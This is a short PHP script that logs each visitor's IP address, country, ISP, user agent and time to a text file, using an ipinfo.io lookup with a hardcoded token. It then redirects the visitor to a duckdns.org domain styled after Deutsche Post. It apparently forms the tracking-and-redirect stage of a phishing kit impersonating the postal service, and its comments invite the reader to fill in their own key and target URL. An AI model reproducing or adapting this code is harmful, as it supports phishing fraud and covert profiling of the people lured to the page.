<?php

function getVisitorIp() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        $ip = $_SERVER['REMOTE_ADDR'];
    }
    return $ip;
}

function getGeolocation($ip, $apiKey) {
    $url = "http://ipinfo.io/{$ip}?token={$apiKey}";
    $response = file_get_contents($url);
    return json_decode($response);
}

$apiKey = "ac22bb26ea7d39"; // Replace with your ipinfo.io API key
$visitorIp = getVisitorIp();
$geoData = getGeolocation($visitorIp, $apiKey);

$userAgent = $_SERVER['HTTP_USER_AGENT'];
$currentDate = date("Y-m-d H:i:s");

$visitorInfo = array(
    'ip' => $visitorIp,
    'country' => $geoData->country,
    'user_agent' => $userAgent,
    'isp' => $geoData->org, // Extract ISP information from the API response
    'date' => $currentDate
);

$file = fopen("visitor_info.txt", "a");
fwrite($file, json_encode($visitorInfo) . "\n");
fclose($file);
header("Location: https://deutsche-post-de.duckdns.org/index.html"); // Replace with the URL you want to redirect to
exit(); // Ensure that code execution stops here

?>
